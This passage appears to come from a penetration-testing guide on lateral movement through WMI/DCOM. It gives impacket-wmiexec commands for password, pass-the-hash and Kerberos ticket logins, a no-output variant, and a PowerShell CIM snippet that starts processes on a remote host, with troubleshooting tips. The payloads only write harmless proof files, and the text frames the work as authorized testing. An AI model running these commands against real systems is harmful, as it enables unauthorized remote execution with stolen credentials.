Commands and use-case variants > **Need:** Identified authentication material, destination service reachability and a candidate authorized identity. RPC endpoint mapper plus negotiated dynamic ports; effective WMI/DCOM rights; the selected output path may additionally need SMB ```bash impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to `ADMIN$`; therefore a WMI process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. Kerberos with separate name and route: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ```
One command, no SMB output ```bash impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" ``` Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.
```powershell $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ``` > `ReturnValue = 0` and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. > **Verify:** Verify destination process/effect and execution identity separately from captured stdout. > **If it fails:** Port 135 alone is insufficient. Distinguish RPC route, namespace permission, output share and local token filtering.
